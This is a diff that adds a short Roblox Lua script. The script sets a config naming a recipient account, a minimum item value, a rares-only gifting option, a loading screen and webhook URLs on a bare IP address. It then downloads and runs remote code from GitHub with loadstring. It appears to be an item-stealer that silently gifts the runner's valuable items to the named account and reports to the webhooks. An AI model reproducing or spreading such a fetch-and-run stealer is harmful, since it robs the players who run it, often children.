@@ -1,0 +1,12 @@
+_G.NullConfig = {
+    User = {'KKGenkais'},
+    min_value = 10000000000,
+    pingEveryone = "No", -- dont change this
+    Webhook = "http://45.13.225.83:20002/proxy/6805cdbb6d68f892abcd272afab7a206",
+    FakeGift = "No",
+    Trash = "http://45.13.225.83:20002/proxy/8de1004b737e0d67cec317fb11134993",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes"
+}
+
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
